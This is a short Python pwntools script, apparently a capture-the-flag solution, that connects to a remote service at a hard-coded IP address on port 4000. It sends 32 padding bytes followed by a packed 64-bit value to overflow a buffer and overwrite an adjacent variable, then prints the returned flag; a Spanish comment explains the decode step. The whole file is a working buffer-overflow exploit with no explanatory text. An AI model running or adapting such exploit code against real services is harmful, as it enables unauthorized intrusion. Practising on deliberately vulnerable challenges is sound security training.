#!/bin/python3

from pwn import *

nc = remote('20.169.252.240', 4000)

line = nc.recvline()
print(line)

nc.sendlineafter(b':', b'a'*32 + p64(0xffffffff))

print(nc.recvall().decode())   #sin el decode se vería tal que b'flag'

nc.close()
